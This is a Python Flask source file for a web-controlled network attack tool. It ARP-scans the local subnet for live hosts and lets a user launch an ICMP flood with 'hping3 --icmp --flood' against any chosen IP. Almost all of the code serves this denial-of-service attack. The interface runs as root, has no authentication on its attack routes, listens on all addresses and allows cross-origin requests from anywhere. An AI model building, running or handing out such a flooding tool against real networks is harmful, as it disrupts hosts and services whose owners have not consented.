#!/usr/bin/env python3
"""
ICMP Flood Attack Web Interface with AirStrike theme
"""

from flask import Flask, render_template, jsonify, request, Blueprint
import scapy.all as scapy
import subprocess
import sys
import time
import os
import threading
import socket
import re
import signal
import logging
from flask_socketio import SocketIO

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.debug = False  # Disable debug mode for production use

# Set up Socket.IO
socketio = SocketIO(cors_allowed_origins="*", logger=True, engineio_logger=True)
socketio.init_app(app)

# Set up logging
logger = logging.getLogger('icmp_flood')
handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
))
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Global variables to track attack state
attack_state = {
    'running': False,
    'attack_type': None,
    'target_ip': None,
    'progress': 0,
    'log': [],
    'stop_event': threading.Event(),
    'threads': []
}

# Config
config = {
    'interface': 'wlan0',
    'output_dir': './captures/'
}

# Statistics
stats = {
    'attacks_count': 0,
    'scan_count': 0
}

def log_message(message):
    """Add a log message."""
    timestamp = time.strftime("%H:%M:%S")
    logger.info(message)
    attack_state['log'].append(f"[{timestamp}] {message}")
    
def in_sudo_mode():
    """Ensure script is run as root."""
    return 'SUDO_UID' in os.environ or os.geteuid() == 0

def get_interface_ip(interface):
    """Get the IP address of a given interface."""
    try:
        output = subprocess.check_output(f"ip addr show {interface}", shell=True).decode()
        match = re.search(r"inet (\d+\.\d+\.\d+)\.\d+/\d+", output)
        if match:
            base_ip = match.group(1)
            return f"{base_ip}.0/24"
    except Exception as e:
        log_message(f"Error getting IP for {interface}: {e}")
        return None

def arp_scan(ip_range):
    """ARP scan the network and return list of live hosts."""
    try:
        arp_responses = []
        answered_lst = scapy.arping(ip_range, verbose=0)[0]
        for res in answered_lst:
            arp_responses.append({"ip": res[1].psrc, "mac": res[1].hwsrc})
        return arp_responses
    except Exception as e:
        log_message(f"Error during ARP scan: {e}")
        return []

def get_interface_names():
    """List all network interface names."""
    try:
        return os.listdir("/sys/class/net")
    except:
        return []

def get_main_interface():
    """Get the main network interface."""
    interfaces = [iface for iface in get_interface_names() if iface not in ["lo", "docker0"]]
    
    # Prefer wlan0 if available
    if "wlan0" in interfaces:
        return "wlan0"
    elif interfaces:
        return interfaces[0]
    else:
        return None

def run_icmp_flood(target_ip, stop_event):
    """Run hping3 ICMP flood on target IP in a separate thread."""
    global attack_state
    
    try:
        log_message(f"Starting ICMP flood attack on {target_ip}")
        attack_process = subprocess.Popen(
            ["sudo", "hping3", "--icmp", "--flood", target_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid
        )
        
        attack_state['running'] = True
        attack_state['progress'] = 50
        socketio.emit('attack_progress', {'progress': 50})
        
        # Emit periodic updates
        while not stop_event.is_set() and attack_process.poll() is None:
            socketio.emit('attack_log', {'message': f"ICMP Flood continuing on {target_ip}..."})
            stop_event.wait(5)  # Check every 5 seconds
        
        # If we get here and the process is still running, kill it
        if attack_process.poll() is None:
            os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
        
    except Exception as e:
        log_message(f"Error running ICMP flood attack: {e}")
    finally:
        attack_state['running'] = False
        attack_state['attack_type'] = None
        attack_state['target_ip'] = None
        attack_state['progress'] = 0
        socketio.emit('attack_stopped', {'message': 'Attack stopped'})

# Socket.IO event handlers
@socketio.on('connect')
def handle_connect():
    logger.info('Client connected')
    # Send a welcome message to confirm connection
    socketio.emit('welcome', {'message': 'Connected to ICMP Flood server'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected')

@socketio.on_error()
def handle_error(e):
    logger.error(f"SocketIO error: {e}")

# Create blueprints
main_bp = Blueprint('main', __name__)
scan_bp = Blueprint('scan', __name__)
attacks_bp = Blueprint('attacks', __name__)
results_bp = Blueprint('results', __name__)
settings_bp = Blueprint('settings', __name__)

# Main routes
@main_bp.route('/')
def index():
    return render_template('index.html')

# Scan routes
@scan_bp.route('/scan')
def scan_page():
    return render_template('scan.html')

@scan_bp.route('/api/scan-network')
def scan_network():
    """Scan the network for live hosts."""
    if not in_sudo_mode():
        return jsonify({"error": "Sudo privileges required"}), 403
    
    # Get main interface
    main_iface = get_main_interface()
    if not main_iface:
        return jsonify({"error": "No valid network interface found"}), 500
    
    # Get IP range
    ip_range = get_interface_ip(main_iface)
    if not ip_range:
        return jsonify({"error": f"Could not get IP range for interface {main_iface}"}), 500
    
    # Perform ARP scan
    hosts = arp_scan(ip_range)
    stats['scan_count'] += 1
    
    # Format the hosts like AirStrike networks
    networks = []
    for host in hosts:
        networks.append({
            "BSSID": host["mac"],
            "ESSID": f"Host {host['ip']}",
            "channel": "N/A",
            "signal": -50,
            "encryption": "N/A",
            "ip": host["ip"]  # Adding IP address as a custom field
        })
    
    return jsonify({
        "networks": networks,
        "interface": main_iface,
        "scan_time": time.time()
    })

# Attack routes
@attacks_bp.route('/attack')
def attack_page():
    return render_template('attack.html')

@attacks_bp.route('/start_attack', methods=['POST'])
def start_attack():
    """
    Start an attack based on the provided parameters.
    
    Expected JSON payload:
    {
        "network": {
            "bssid": "00:11:22:33:44:55",
            "essid": "NetworkName",
            "ip": "192.168.1.1"  # IP address for ICMP attack
        },
        "attack_type": "icmp_flood|deauth",
        "config": {
            // Attack-specific configuration
        }
    }
    """
    try:
        # Check if an attack is already running
        if attack_state['running']:
            return jsonify({'success': False, 'error': 'An attack is already running'})
        
        # Validate request data
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'})
        
        if 'network' not in data or 'attack_type' not in data:
            return jsonify({'success': False, 'error': 'Missing required parameters'})
        
        # Get attack parameters
        network = data['network']
        attack_type = data['attack_type']
        attack_config = data.get('config', {})
        
        # Initialize attack state
        attack_state['running'] = True
        attack_state['attack_type'] = attack_type
        attack_state['progress'] = 0
        attack_state['log'] = []
        attack_state['stop_event'] = threading.Event()
        attack_state['threads'] = []
        
        # Log the start of the attack
        log_message(f"Starting {attack_type} attack")
        
        # Emit attack started event via WebSocket
        socketio.emit('attack_started', {
            'attack_type': attack_type,
            'target_network': network
        })
        
        try:
            # Launch the appropriate attack
            if attack_type == 'icmp_flood':
                target_ip = network.get('ip')
                if not target_ip:
                    return jsonify({'success': False, 'error': 'IP address required for ICMP flood attack'})
                
                # Validate IP format
                try:
                    socket.inet_aton(target_ip)
                except socket.error:
                    return jsonify({'success': False, 'error': 'Invalid IP address'})
                
                attack_state['target_ip'] = target_ip
                
                # Start ICMP flood thread
                icmp_thread = threading.Thread(
                    target=run_icmp_flood,
                    args=(target_ip, attack_state['stop_event']),
                    daemon=True
                )
                
                attack_state['threads'].append(icmp_thread)
                icmp_thread.start()
            elif attack_type == 'deauth':
                # TODO: Implement deauth attack logic if needed
                return jsonify({'success': False, 'error': 'Deauth attack not implemented yet'})
            else:
                attack_state['running'] = False
                socketio.emit('attack_error', {'error': f'Unknown attack type: {attack_type}'})
                return jsonify({'success': False, 'error': f'Unknown attack type: {attack_type}'})
            
            stats['attacks_count'] += 1
            
            return jsonify({'success': True})
        except Exception as e:
            attack_state['running'] = False
            socketio.emit('attack_error', {'error': str(e)})
            return jsonify({'success': False, 'error': str(e)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@attacks_bp.route('/stop_attack', methods=['POST'])
def stop_attack():
    """Stop the running attack."""
    if not attack_state['running']:
        return jsonify({'success': False, 'error': 'No attack currently running'})
    
    attack_state['stop_event'].set()
    
    # Wait for threads to finish
    for thread in attack_state['threads']:
        thread.join(timeout=2)
    
    return jsonify({'success': True})

@attacks_bp.route('/attack_status')
def attack_status():
    """Get the current attack status."""
    return jsonify({
        'running': attack_state['running'],
        'attack_type': attack_state['attack_type'],
        'progress': attack_state['progress'],
        'target_ip': attack_state['target_ip']
    })

@results_bp.route('/results')
def results_page():
    return render_template('results.html')

@results_bp.route('/get_attack_log')
def get_attack_log():
    return jsonify({
        'log': attack_state['log'],
        'running': attack_state['running'],
        'progress': attack_state['progress']
    })

@settings_bp.route('/settings')
def settings_page():
    return render_template('settings.html')

@app.errorhandler(404)
def page_not_found(e):
    """Handle 404 errors."""
    logger.warning(f"404 error: {request.path}")
    return render_template('error.html', error=f"Page {request.path} not found"), 404

@app.errorhandler(500)
def internal_server_error(e):
    """Handle 500 errors."""
    logger.error(f"500 error: {str(e)}")
    return render_template('error.html', error=str(e)), 500

# Register blueprints
app.register_blueprint(main_bp)
app.register_blueprint(scan_bp, url_prefix='/scan')
app.register_blueprint(attacks_bp, url_prefix='/attacks')
app.register_blueprint(results_bp, url_prefix='/results')
app.register_blueprint(settings_bp, url_prefix='/settings')

if __name__ == '__main__':
    if not in_sudo_mode():
        print("=" * 80)
        print("ERROR: ICMP Flood must be run with root privileges!")
        print("The application will now exit.")
        print("Please restart with: sudo python app.py")
        print("=" * 80)
        sys.exit(1)
        
    # Create output directory if it doesn't exist
    os.makedirs(config['output_dir'], exist_ok=True)
    
    print("\n" + "=" * 60)
    print("Starting ICMP Flood with Socket.IO enabled")
    print("Using root privileges: {}".format("Yes" if in_sudo_mode() else "No"))
    
    # Print a clickable link with different formats for better compatibility
    print("\nAccess the web interface at:")
    print("\033[1;34mhttp://localhost:5000\033[0m")  # Bold blue
    print("\033]8;;http://localhost:5000\033\\Click here to open in browser\033]8;;\033\\")  # Hyperlink
    print("=" * 60 + "\n")
    
    # Run the Flask app with Socket.IO
    socketio.run(app, debug=False, host='0.0.0.0', port=5000)
